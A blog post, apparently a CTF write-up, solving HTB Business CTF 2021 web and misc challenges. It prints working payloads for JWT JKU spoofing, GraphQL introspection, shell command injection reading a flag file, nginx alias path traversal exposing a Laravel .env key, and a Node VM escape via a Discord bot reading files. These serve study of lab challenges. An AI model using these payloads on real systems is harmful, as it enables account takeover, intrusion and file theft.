---
layout: post
title: HTB Busines CTF 2021 Writeup
published: true
categories: [Web, Misc]
excerpt: I solved 3 web challenges alone within 3 hours of starting the CTF. Was the Captain of our company team PwnWithClass, made up of members from Japan, Spain and France. Also worked on the last web challenge and the only misc challenge with a teammate.
---

I solved 3 web challenges alone within 3 hours of starting the CTF. Was the Captain of our company team PwnWithClass, made up of PwC members from Japan, Spain and France. Also worked on the last web challenge and the only misc challenge with a teammate.

---

## Web

---

# Emergency

#### Category: Web | 325 points

<details>
  <summary>Challenge Description</summary>
  
You've been tasked with a pentesting engagement on a hospital management portal, they've provided you with a mockup build of the website and they've asked you to break their JWT implementation and find a way to login as "admin".
</details>

Judging based on the description, this was exactly the same problem as the one in Nahamcon 2020. [My writeup](https://isopach.dev/Nahamcon-2020-Flag-Jokes/) was bad and I admit it so I am going to write a new one.

So first you want to create an account with any name. You'll need it to get the JWT. This JWT was generated for my account `admin1`:     
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3QvLndlbGwta25vd24vandrcy5qc29uIiwia2lkIjoiOGIzZTllNWMtODE2MS00NWM3LWE2NWUtMGJiZjAxNzk1ZDE3In0.eyJ1c2VybmFtZSI6ImFkbWluMSIsImlhdCI6MTYyNzA1NTQ3NiwiZXhwIjoxNjI3MDc3MDc2fQ.SP1mPRAf1CZbWO0wNpn31I7rEcQvsKlf_KlR5OLvNNvsc3_0vTbQ_jj_VHSGl5eoAmJMVzU_Lsqn5oTDvDx0f8L5IyC2zoeJaxQJDr4kpv1KdF0xP5fRIxPrJmXtZFULBYlLLl_owEaNqkc0HjyKOkcY5NEormQpKx3b90Km4rPUsHUazj2Qo9bWLYkhuE6bwefF0pviquIk9lfaUhm_zxpMbq-5adCkXUAL56gnCF-YjXYACxZOHiSBGRsiP6EFe2vSwG-Bgq9lHxr1oxFKgl3lbCHlHPtN6GSdp07kNxnOebG89lrvgE4GY9WAz9be7VPedo-vrO8LhclYDIQbxg
```
 

Decoding the Base64, we get `{"typ":"JWT","alg":"RS256","jku":"http://localhost/.well-known/jwks.json","kid":"8b3e9e5c-8161-45c7-a65e-0bbf01795d17` (truncated for relevancy). 

So from here we can guess that it is probably the JKU spoof attack where we replace the JKU with a URL we control and generate a RSA key pair to sign the JWT with.

Using this [mkjwk](https://mkjwk.org/) to make our JWK, I specify the `Key ID` by using the value of `kid` in the JWT above, so `8b3e9e5c-8161-45c7-a65e-0bbf01795d17`. Generating the JWK with the following options: `Key Size: 2048, Key Use: Signature, Algorithm: RSA256, Show X.509: Yes`, I got the following data which we will be using in order:

**Public Key**
```json
{
    "kty": "RSA",
    "e": "AQAB",
    "use": "sig",
    "kid": "8b3e9e5c-8161-45c7-a65e-0bbf01795d17",
    "alg": "RS256",
    "n": "uh0trtU2mVG2_v7GS8_yxLyTjHim5XLq50dLv15co0Fhn0nFrdY1-ovnqdvYXwNVkgbkxXIKQ76sxZujGZCSWN9Lx8mCuThVCRyO6UCtDUcTZ0k1z5Rr2TAs7WKKFe3b4CimizDylI2wXCZAIsJbFODzTMqRa2rxNOmUrCqjtxk8mxHRwfZkL63xw-tEoXDjYTqzIkT_8_gaSI9JysHoVo3GGvcXW07UgQhEj8YA6UiAwk8xgNyeFmtJxzJyysISDlf0dkn1fENw926b2ptC70331mjm3TJLoqKxD2X9xb35srxc6UgxZwQFCgVwCshQblrCsNPuJFSQw2dPvnjQXQ"
}
```

I wrapped this in the `key` set and put it on my server as follows:

**jwks.json**
```json
{
    "keys": [
        {
    "kty": "RSA",
    "e": "AQAB",
    "use": "sig",
    "kid": "8b3e9e5c-8161-45c7-a65e-0bbf01795d17",
    "alg": "RS256",
    "n": "uh0trtU2mVG2_v7GS8_yxLyTjHim5XLq50dLv15co0Fhn0nFrdY1-ovnqdvYXwNVkgbkxXIKQ76sxZujGZCSWN9Lx8mCuThVCRyO6UCtDUcTZ0k1z5Rr2TAs7WKKFe3b4CimizDylI2wXCZAIsJbFODzTMqRa2rxNOmUrCqjtxk8mxHRwfZkL63xw-tEoXDjYTqzIkT_8_gaSI9JysHoVo3GGvcXW07UgQhEj8YA6UiAwk8xgNyeFmtJxzJyysISDlf0dkn1fENw926b2ptC70331mjm3TJLoqKxD2X9xb35srxc6UgxZwQFCgVwCshQblrCsNPuJFSQw2dPvnjQXQ"
}
    ]
}
```

Next, I opened jwt.io and pasted the original JWT there. Then I changed the `username` to `admin`, as well as the `jku` location to my server. Plugging the values of the Public/Private key generated on the mkjwk, I signed my JWT and copied the value:     
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vbXktcmVkYWN0ZWQtc2VydmVyLmNvbS8ud2VsbC1rbm93bi9qd2tzLmpzb24iLCJraWQiOiI4YjNlOWU1Yy04MTYxLTQ1YzctYTY1ZS0wYmJmMDE3OTVkMTciZlEueyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjI3MDU1NDc2LCJleHAiOjE2MjcwNzcwNzZ9LpBPHjpXKyeYjEok6iLhXBd4mknFofKN5lYCSNO3tsDCWWPbunTPIV2DEaii0zEtFzh371pj4v2vGKc4F69AebedGxYvlyabUD4wXx79+twyTfY787i1OagSF71+sXd0Vu+lqlpILeZpAe+MhHEcdwLagxVPFIsm2mEZK8k6kAOxnEkhANHBpHo5aCM4+Zd3O162C96oz7Z2+4PQ0kUtL7y3sMDNN0EyLdcexyNroDBs3mxaOV/oQyiGCGpijZ7zCaAfJ8wvcNxzNl93QV9sLUYtCdoira3pjIjLcmYXI3V6SyWPxauSsVSwWkp8nchQ1zEWZxPdo43q4SkqbbDqP5FyyUdTLTVYUQ==
```     
to my browser, expecting to see the flag. 


Unfortunately, I kept getting the error `{"error":"1","message":"Invalid exponent and/or modulus","type":"BadRequest"}` and got stuck for 1 hour, trying stuff like changing the `e` to `65537`.

Eventually, I figured out that the `n` value has to be in decimal too, so I converted it like this:

```bash
root@HAL9000:~/tmp# vi htb.pub
root@HAL9000:~/tmp# root@HAL9000:~/tmp# HEX_MODULUS=$(openssl rsa -pubin -in htb.pub  -modulus | grep 'Modulus=' |  cut -d'=' -f 2)
writing RSA key
root@HAL9000:~/tmp# ruby<<EOF
> p "$HEX_MODULUS".to_i(16).to_s(10)
> EOF
"23494713153146897073231851090567260781450157456425116854303721744011152821639777746682203306582546477712436659437002837947909798593759161457484965978266575043736700774598779467136095722722762074622565002022391855997657246109418755927518031426714782038269518158392626096213177704747164626477336670590967207124515298835609974005208298992267240882968540559947577194560245943576045090125766441398987535883809202289001828212084374844156574785050678135407471633806407583633969505583747256274039561138268532684534228623301084429444683704026301173137910234357553468012288252224247144696944878377210139936280672952903657902173"
``` 

Putting it together, my final JWK was:

**jwks.json**
```json
{
    "keys": [
        {
    "kty": "RSA",
    "e": "65537",
    "use": "sig",
    "kid": "8b3e9e5c-8161-45c7-a65e-0bbf01795d17",
    "alg": "RS256",
    "n": "23494713153146897073231851090567260781450157456425116854303721744011152821639777746682203306582546477712436659437002837947909798593759161457484965978266575043736700774598779467136095722722762074622565002022391855997657246109418755927518031426714782038269518158392626096213177704747164626477336670590967207124515298835609974005208298992267240882968540559947577194560245943576045090125766441398987535883809202289001828212084374844156574785050678135407471633806407583633969505583747256274039561138268532684534228623301084429444683704026301173137910234357553468012288252224247144696944878377210139936280672952903657902173"
}
    ]
}
```

And finally I got the flag!

![Emergency Flag](../assets/htb-business-ctf-2021/emergency_flag_gui.png)


<details>
  <summary>FLAG</summary>
  
   HTB{your_JWTS_4r3_cl41m3d!!}
</details>

***

# NoteQL

#### Category: Web | 325 points

<details>
  <summary>Challenge Description</summary>
  
WIP
</details>

We're given a page where we can add/delete notes with a specified title. 

![NoteQL Challenge](../assets/htb-business-ctf-2021/noteql.png)

As hinted in the challenge name, this is a GraphQL challenge. So naturally, I dumped the schema on my first request using `{"query":"{$payload}"}` where `$payload` is as follows:

```json
__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```

Going through the schema, I found the following functions:

- createNote
- updateNote
- completeNote
- deleteNote
- AllNotes
- Note
- MyNotes

Calling the function `AllNotes` with the query `{"query":"{AllNotes{id,title}}"}` led to the flag.

```json
{"data":{"AllNotes":[{"id":"2","title":"Learn mandarin"},{"id":"3","title":"HTB{n0b0dy_c0ntr0ls_m3!!}"},{"id":"4","title":"Clean up the pantry"},{"id":"5","title":"Walk the dog"},{"id":"7","title":"111"},{
```


<details>
  <summary>FLAG</summary>
  
   HTB{n0b0dy_c0ntr0ls_m3!!}
</details>

*** 

# Time

#### Category: Web | 300 points

<details>
  <summary>Challenge Description</summary>
  
WIP
</details>

We're given the source code for this, so no need to guess. A cursory look at the `Router.php` showed that the request URI takes user input without sanitization, and the exec call in `TimeModel.php` confirmed that RCE is possible.

**Router.php**
```php
public function getRouteParameters($route)
    {
        $params = [];
        $uri = explode('/', strtok($_SERVER['REQUEST_URI'], '?'));
        $route = explode('/', $route);

        foreach ($route as $key => $value)
        {
            if ($uri[$key] == $value) continue;
            if ($value == '{param}')
            {
                if ($uri[$key] == '')
                {
                    $this->abort(404);
                }
                $params[] = $uri[$key];
            }
        }

        return $params;
    }
```

**TimeModel.php**
```php
public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
```

Hence we simply send a valid function call `date --help` and append our payload `cat ../flag` to get the flag.

`/?format='date --help ; cat ../flag'` 


![Time Flag](../assets/htb-business-ctf-2021/web_time_flag.png)

<details>
  <summary>FLAG</summary>
  
   HTB{tim3_t4lks..4nd_1t_s4ys_1ts_t1m3_t0_PWN!!!}
</details>

*** 

# Larablog

#### Category: Web | 350 points

<details>
  <summary>Challenge Description</summary>
  
WIP
</details>

Blog built in Laravel. However, we are only given the nginx config on the home page. I didn't copy the code, but the `nginx.conf` had a vulnerability in that the trailing slash was not added a path:

**nginx.conf**
```bash
location /assets {
	alias /www/public/;
}
```

This part of the configuration allows directory traversal by `/assets../dir`. Given that the challenge name is Larablog, I assumed it was a Laravel implementation so I opened the laravel source code repo on [Github](https://github.com/laravel/laravel). Reading the `composer.json`, I found a way to get the environment variables as follows:

**composer.json**
```bash
"post-root-package-install": [
            "@php -r \"file_exists('.env') || copy('.env.example', '.env');\""
        ],
```

Thus, by accessing `$HOST/assets../.env`, we are able to get the list of env variables, which revealed the `APP_KEY`.

`APP_KEY=base64:Tdn3C0gQJrFhyyxx90+kSow2S1aud1HCvqTI8lgeTdw=`

According to [this blog](https://blog.truesec.com/2020/02/12/from-s3-bucket-to-laravel-unserialize-rce/), having the `APP_KEY` means you can likely decrypt the laravel session cookie, although we didn't get anywhere with it.

After that, again assuming that it is the default Laravel implementation, I accessed `$HOST/assets../config/app.php` and got the version number (5.5.40) and cipher type (AES-256-CBC).

Searching Google for `Laravel Framework 5.5.40 vulnerabilities` led us to the Metasploit module [PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unserialize Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/47129), and modifying the `laravel_session` into `blog_session` and running it against the server should give the flag, although I only found out this final step after the CTF ended :(

Anyway, no bruteforce or file discovery was needed although it was blackbox. 

<details>
  <summary>FLAG</summary>
  
   
</details>

---

## Misc

---

# discordvm

#### Category: Misc | 350 points

<details>
  <summary>Challenge Description</summary>
  
WIP
</details>

This challenge involves getting RCE on a Discord bot via Discord private messages. It shows how dangerous an unsanitized user input given to the bot can compromise the server, which makes sense given that most bots run on NodeJS. 

Here's the introduction to the bot so you can see what I mean.

![1+1](../assets/htb-business-ctf-2021/discordvm_oneplusone.png)


Anyway this challenge was blackbox. We were to join a server and add the Discord bot there as our target. However, the staff warned that it is not a bruteforcing challenge and that people who tried bruteforcing would be banned:

![No bruteforcing](../assets/htb-business-ctf-2021/discordvm_warning.png)

One thing I didn't like is how the challenge kept getting modified. The teams who solved it first used some unintended solution which probably involved `process.binding`, but that was patched as you can see in the above image. We found our payload that worked during the first few hours not working later during the day, which made me ragequit and my teammate Xoan solved this instead. 

So anyway the first 'protection' the bot has is that no spaces are allowed. 

![Spaces banned](../assets/htb-business-ctf-2021/discordvm_spacesbanned.png)

As you can see, a SyntaxError was triggered when I tried to use the typical JS constructor in an attempt to log the return command. We found a way to bypass this by using the ASCII representation for space, i.e. `String.fromCharCode(32)`. Hence you can call the above `return this` with this payload:

```javascript
!calc log(this.constructor.constructor(["return","this"].join(String.fromCharCode(32))))
```

Likewise, you can also call `this.process.binding` to escape the VM, however we couldn't find a way to read the file.

At this point it was 6am so I went to sleep. When I woke up to try the payload again, it was broken:

![Broken payload](../assets/htb-business-ctf-2021/discordvm_brokenpayload.png)

We figured that it was an unintended solution hence they patched the solution without giving thought that the teams who solved it earlier would have a big advantage. 

I quit at this point and my teammate continued, using the hint shown in the first image which was to use `this.process.mainModule.require` instead. Since it was under the `mainModule`, it took some indepth research to find this function. 

We were able to execute some commands using this payload:

```javascript
!calc rd=this.constructor.constructor(["return","this.process.mainModule.require"].join(String.fromCharCode(32)))()('$payload').readdir
rd('./',{},"","",function(err,data){data})
```

However, calling commands like `fs` mysteriously returned `undefined`. After more research, we discovered that this StackOverflow question with the exact same problem we were facing! [NodeJS - Confusion about async “readdir” and “stat”: Returns error cannot read .then of undefined](https://stackoverflow.com/q/51180577/4420129). It turns out that `readdir` is asynchronous and hence it returns the result of `$payload` regardless of whether it has been populated or not.

Hence, by modifying `readdir` to `readdirSync`, it became possible to read the filesystem!

```javascript
!calc rd=this.constructor.constructor(["return","this.process.mainModule.require"].join(String.fromCharCode(32)))()('fs').readdirSync
rd('.',(err,data)=>{data})
```

![Read Directory](../assets/htb-business-ctf-2021/discordvm_readdir.png)


Since we can see the flag now, let's read it with `readFileSync`: 

```javascript
!calc rd=this.constructor.constructor(["return","this.process.mainModule.require"].join(String.fromCharCode(32)))()('fs').readFileSync
rd('flag.txt',(err,data)=>{data})
```

![Flag](../assets/htb-business-ctf-2021/discordvm_flag.png)


Again, all credits goes to my teammate Xoan for solving this, I'm just including it here so we can all learn from him.


<details>
  <summary>FLAG</summary>
  
   HTB{4lw4ys_RTFM!1}
</details>